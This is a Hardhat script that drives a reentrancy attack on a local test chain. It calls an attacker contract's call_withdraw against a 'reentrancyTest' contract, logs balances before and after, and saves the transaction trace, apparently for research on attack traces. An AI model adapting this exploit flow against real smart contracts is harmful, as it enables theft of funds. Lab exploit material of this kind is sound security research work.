const {ethers} = require("hardhat");
const {saveTrace} = require("../../utils/saveTrace.js");
const {loadContext} = require ("../Single_function_reentrancy/context.js");
async function main () {
    const ctx = await loadContext();
    console.log("attacker account balance before executing attack = ", await ethers.formatEther(await ethers.provider.getBalance(ctx.attackerAddress)));;
    console.log("reentrancyTest account balance before executing attack = ", await ethers.formatEther(await ethers.provider.getBalance(ctx.reentrancyTestAddress)));;
    console.log("attacker account balance before executing attack = ", await ethers.formatEther(await ethers.provider.getBalance(ctx.attacker)));;

    const amount = ethers.parseEther("1");
    const calldata = ctx.contractAttacker.interface.encodeFunctionData("call_withdraw", [amount]);
    const tx = await ctx.attacker.sendTransaction({
        to : ctx.attackerAddress,
        data: calldata,
       // value: ethers.parseEther("1")    
    })
    const receipt = await tx.wait();
    console.log(tx.hash);

    console.log("attacker account balance after executing attack = ", await ethers.formatEther(await ethers.provider.getBalance(ctx.attackerAddress)));;
    console.log("reentrancyTest account balance after executing attack = ", await ethers.formatEther(await ethers.provider.getBalance(ctx.reentrancyTestAddress)));;
    console.log("attacker account balance after executing attack = ", await ethers.formatEther(await ethers.provider.getBalance(ctx.attacker)));;

    await saveTrace(tx.hash, "../../traces/hardhat_traces/attacker", "attack")
 
}
main().catch(console.error);